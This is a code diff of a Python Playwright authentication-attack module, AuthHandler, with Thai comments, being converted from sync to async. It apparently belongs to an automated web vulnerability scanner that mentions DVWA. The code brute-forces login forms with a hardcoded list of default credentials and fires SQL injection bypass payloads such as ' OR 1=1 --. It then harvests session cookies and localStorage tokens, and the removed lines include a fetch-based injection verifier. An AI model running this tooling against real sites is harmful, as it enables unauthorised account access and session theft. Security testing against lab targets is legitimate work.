@@ -1,76 +1,79 @@
-from playwright.sync_api import Page, sync_playwright
 import base64
-import time
+import asyncio
+import json
+from playwright.async_api import Page, BrowserContext
 from src.core.logger import setup_logger
 
 class AuthHandler:
     def __init__(self, logger=None):
         self.logger = logger or setup_logger("AuthHandler")
         self.cookies = None
-        self.auth_token = None # สำหรับเก็บ JWT หรือ Bearer Token ใน SPA
+        self.auth_token = None
         self.default_creds = [
             ("admin", "admin"), ("admin", "password"),
             ("root", "root"), ("user", "user"),
             ("admin", "admin123"), ("admin", "123456")
         ]
 
-    def find_and_login(self, page: Page, creds: dict) -> bool:
-        """ตรวจหาฟอร์มและพยายาม Login ด้วย Credential ที่ให้มา"""
-        # เคลียร์ปลาเตอร์เตือนต่างๆ ก่อน (ถ้ามีใน context ของ crawler)
+    async def find_and_login(self, page: Page, creds: dict) -> bool:
+        """[ASYNC] ตรวจหาฟอร์มและพยายาม Login"""
         password_input = page.locator('input[type="password"]')
         
-        if password_input.count() > 0:
+        # ตรวจสอบจำนวน element ต้องใช้ await
+        if await password_input.count() > 0:
             self.logger.info(f"[Auth] 🕵️ Potential login form detected at {page.url}")
-            return self.login_with_heuristics(page, creds)
+            return await self.login_with_heuristics(page, creds)
         
-        # ลองหาปุ่ม Login เพื่อนำทางไปหน้า Login
         login_indicators = 'a:has-text("Login"), a:has-text("Sign in"), button:has-text("Login"), .login-btn'
         login_btn = page.locator(login_indicators).first
-        if login_btn.is_visible():
+        
+        if await login_btn.is_visible():
             try:
-                login_btn.click()
-                page.wait_for_load_state("networkidle")
-                return self.login_with_heuristics(page, creds)
+                await login_btn.click()
+                await page.wait_for_load_state("networkidle")
+                return await self.login_with_heuristics(page, creds)
             except: pass
             
         return False
 
-    def login_with_heuristics(self, page: Page, creds: dict) -> bool:
-        """กรอกข้อมูล Login โดยใช้การเดา Selector"""
+    async def login_with_heuristics(self, page: Page, creds: dict) -> bool:
+        """[ASYNC] กรอกข้อมูล Login โดยใช้ Heuristics"""
         try:
             user_selector = 'input[type="text"], input[type="email"], input[name*="user"], input[id*="email"]'
             user_input = page.locator(user_selector).first
             pass_input = page.locator('input[type="password"]').first
-            submit_btn = page.locator('button[type="submit"], input[type="submit"], button:has-text("Login"), button:has-text("Log in")').first
+            submit_btn = page.locator('button[type="submit"], input[type="submit"], button:has-text("Login")').first
 
-            if user_input.is_visible() and pass_input.is_visible():
-                user_input.fill(creds.get("username", "admin"))
-                pass_input.fill(creds.get("password", "admin"))
+            if await user_input.is_visible() and await pass_input.is_visible():
+                await user_input.fill(creds.get("username", "admin"))
+                await pass_input.fill(creds.get("password", "admin"))
                 
-                # คลิกและรอ Navigation
-                with page.expect_navigation(timeout=8000, wait_until="networkidle"):
+                # ใน Async ใช้ asyncio.gather หรือรอแยกกัน
+                await asyncio.gather(
+                    page.wait_for_load_state("networkidle"),
                     submit_btn.click()
+                )
                 
-                if self._check_success(page):
-                    self._capture_session(page)
+                if await self._check_success(page):
+                    await self._capture_session(page)
                     self.logger.info("[Auth] ✅ Login Successful!")
                     return True
         except Exception as e:
             self.logger.debug(f"[Auth] Heuristic Login failed: {e}")
         return False
 
-    def aggressive_entry(self, page: Page) -> bool:
-        """พยายามเจาะเข้าหน้า Login เมื่อไม่มีรหัสผ่าน"""
-        if page.locator('input[type="password"]').count() == 0:
+    async def aggressive_entry(self, page: Page) -> bool:
+        """[ASYNC] Brute-force และ SQLi Bypass"""
+        if await page.locator('input[type="password"]').count() == 0:
             return False
 
         self.logger.info(f"[Auth] 🛡️ Attempting Aggressive Entry at {page.url}")
         
-        if self._try_sqli_bypass(page): return True
-        if self._try_default_creds(page): return True
+        if await self._try_sqli_bypass(page): return True
+        if await self._try_default_creds(page): return True
         return False
 
-    def _try_sqli_bypass(self, page: Page) -> bool:
+    async def _try_sqli_bypass(self, page: Page) -> bool:
         payloads = ["' OR 1=1 --", "' OR '1'='1", '" OR 1=1 --']
         user_input = page.locator('input[type="text"], input[type="email"]').first
         pass_input = page.locator('input[type="password"]').first
@@ -78,150 +81,61 @@ class AuthHandler:
 
         for payload in payloads:
             try:
-                # DVWA ต้องการ Token ใหม่ทุกครั้งที่โหลดหน้า
-                page.reload(wait_until="networkidle") 
-                
+                await page.reload(wait_until="networkidle") 
                 self.logger.info(f"[Auth] Testing SQLi Bypass: {payload}")
-                user_input.fill(payload)
-                pass_input.fill("anything") # DVWA บางเวอร์ชันต้องการค่าในช่อง pass ด้วย
+                await user_input.fill(payload)
+                await pass_input.fill("anything")
                 
-                # คลิกปุ่ม Login (DVWA บางทีใช้ input[name="Login"])
-                submit_btn.click()
-                page.wait_for_load_state("networkidle")
+                await submit_btn.click()
+                await page.wait_for_load_state("networkidle")
 
-                if self._check_success(page):
-                    self._capture_session(page)
+                if await self._check_success(page):
+                    await self._capture_session(page)
                     return True
             except: continue
         return False
 
-    def _capture_session(self, page: Page):
-        """เก็บ Session ข้อมูลเพื่อใช้ Persistence"""
-        self.cookies = page.context.cookies()
-        # เก็บ LocalStorage เผื่อเป็นแอปแบบ JWT (SPA)
-        self.auth_token = page.evaluate("() => JSON.stringify(localStorage)")
-        self.logger.debug("[Auth] Session captured and stored.")
+    async def _capture_session(self, page: Page):
+        """[ASYNC] เก็บ Cookies และ LocalStorage"""
+        self.cookies = await page.context.cookies()
+        # evaluate ต้องใช้ await
+        self.auth_token = await page.evaluate("() => JSON.stringify(localStorage)")
+        self.logger.debug("[Auth] Session captured.")
 
-    def apply_session(self, context):
-        """ใช้ฟังก์ชันนี้ใน Crawler เพื่อโหลด Session ที่เคย Login แล้ว"""
+    async def apply_session(self, context: BrowserContext):
+        """[ASYNC] โหลด Session เข้า Context ใหม่"""
         if self.cookies:
-            context.add_cookies(self.cookies)
-            # หมายเหตุ: LocalStorage ต้องยัดผ่าน page.evaluate หลังจากเปิดหน้าแรก
+            await context.add_cookies(self.cookies)
             return True
         return False
 
-    def _check_success(self, page: Page) -> bool:
-        # เพิ่มการเช็ค URL Change และ Response Status
-        # และเช็ค Cookies ที่เปลี่ยนไป (เช่น มี session id ใหม่เกิดขึ้น)
+    async def _check_success(self, page: Page) -> bool:
         indicators = ["logout", "sign out", "dashboard", "settings", "profile"]
-        has_indicator = any(ind in page.content().lower() for ind in indicators)
-        
-        # เช็คว่า URL เปลี่ยนจากหน้า /login หรือไม่
+        content = (await page.content()).lower()
+        has_indicator = any(ind in content for ind in indicators)
         is_not_login_url = "login" not in page.url.lower()
-        
         return has_indicator and is_not_login_url
 
-    def verify_sqli_bypass(self, url: str, method: str, param_key: str, payload: str, content_type: str):
-        """ตรวจสอบและถ่ายรูปหลักฐาน (Verifier Module)"""
-        self.logger.info(f"[VERIFIER] Verifying SQLi Bypass at {url}")
-        result = {"confirmed": False, "screenshot": None}
+    async def _try_default_creds(self, page: Page) -> bool:
+        self.logger.info("[Auth] 🔑 Testing default credentials...")
+        user_input = page.locator('input[type="text"], input[type="email"], input[name*="user"]').first
+        pass_input = page.locator('input[type="password"]').first
+        submit_btn = page.locator('button[type="submit"], input[type="submit"]').first
 
-        try:
-            with sync_playwright() as p:
-                browser = p.chromium.launch(channel="chrome", headless=True)
-                context = browser.new_context(ignore_https_errors=True)
-                page = context.new_page()
-
-                fetch_script = self._generate_fetch_script(url, method, param_key, payload, content_type)
-                page.goto(url) # เปิดหน้าเป้าหมายก่อน
-                page.evaluate(fetch_script)
-                
-                page.wait_for_load_state("networkidle")
-                time.sleep(2) # รอ Redirect
-
-                if self._check_success(page):
-                    result["confirmed"] = True
-                    # ใส่ Overlay เพื่อความชัดเจนในรายงาน
-                    page.evaluate("""() => {
-                        const div = document.createElement('div');
-                        div.style = "position:fixed;top:0;width:100%;bg:red;color:white;z-index:9999;text-align:center;padding:10px;font-size:20px;background:rgba(255,0,0,0.8);";
-                        div.innerText = "🚨 VULNERABILITY CONFIRMED: SQL INJECTION BYPASS";
-                        document.body.appendChild(div);
-                    }""")
-                    result["screenshot"] = self._capture_evidence(page)
-
-                browser.close()
-        except Exception as e:
-            self.logger.error(f"[VERIFIER] Error: {e}")
-        return result
-
-    def _capture_evidence(self, page: Page) -> str:
-        try:
-            return base64.b64encode(page.screenshot(full_page=False)).decode('utf-8')
-        except: return None
-
-    def _generate_fetch_script(self, url, method, param_key, payload, content_type):
-        safe_payload = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
-        is_json = content_type.lower() == "json"
-        
-        return f"""
-        (async () => {{
-            const options = {{
-                method: '{method.upper()}',
-                headers: {{ 'Content-Type': '{ 'application/json' if is_json else 'application/x-www-form-urlencoded' }' }},
-                body: { f'JSON.stringify({{ "{param_key}": `{safe_payload}` }})' if is_json else f'new URLSearchParams("{param_key}=" + `{safe_payload}`) ' }
-            }};
-            const resp = await fetch('{url}', options);
-            const text = await resp.text();
-            document.open(); document.write(text); document.close();
-        }})();
-        """
-    
-    def _try_default_creds(self, page: Page) -> bool:
-        """[FIXED] ลองใช้รหัสผ่านมาตรฐานจาก list ที่เตรียมไว้"""
-        self.logger.info("[Auth] 🔑 Testing common default credentials...")
-        
-        user_selector = 'input[type="text"], input[type="email"], input[name*="user"]'
-        pass_selector = 'input[type="password"]'
-        submit_selector = 'button[type="submit"], input[type="submit"], button:has-text("Login")'
-
-        user_input = page.locator(user_selector).first
-        pass_input = page.locator(pass_selector).first
-        submit_btn = page.locator(submit_selector).first
-
-        if not user_input.is_visible() or not pass_input.is_visible():
-            return False
+        if not await user_input.is_visible(): return False
 
         for username, password in self.default_creds:
             try:
-                self.logger.debug(f"[Auth] Trying: {username} / {password}")
-                user_input.fill("") # เคลียร์ค่าเก่า
-                user_input.fill(username)
-                pass_input.fill("")
-                pass_input.fill(password)
-                
-                # คลิกและรอโหลด
-                submit_btn.click()
-                page.wait_for_load_state("networkidle", timeout=3000)
+                await user_input.fill(username)
+                await pass_input.fill(password)
+                await submit_btn.click()
+                await page.wait_for_load_state("networkidle", timeout=5000)
 
-                if self._check_success(page):
-                    self._capture_session(page)
-                    self.logger.info(f"[Auth] ✅ Default Creds Success: {username}:{password}")
+                if await self._check_success(page):
+                    await self._capture_session(page)
                     return True
                 
-                # ถ้าไม่สำเร็จ ให้กลับไปหน้าเดิมเพื่อลองคู่ถัดไป
                 if "login" not in page.url.lower():
-                    page.go_back()
-            except:
-                continue
+                    await page.go_back()
+            except: continue
         return False
-
-    def _get_csrf_token(self, page: Page) -> str:
-        """[GENERIC] พยายามหา CSRF Token จากหน้าเว็บ (สำคัญมากสำหรับ DVWA)"""
-        try:
-            # ค้นหาจาก hidden input ที่ชื่อมักจะมีคำว่า token
-            token_element = page.locator('input[type="hidden"][name*="token"], input[type="hidden"][id*="token"]').first
-            if token_element.count() > 0:
-                return token_element.get_attribute("value")
-        except: pass
-        return ""
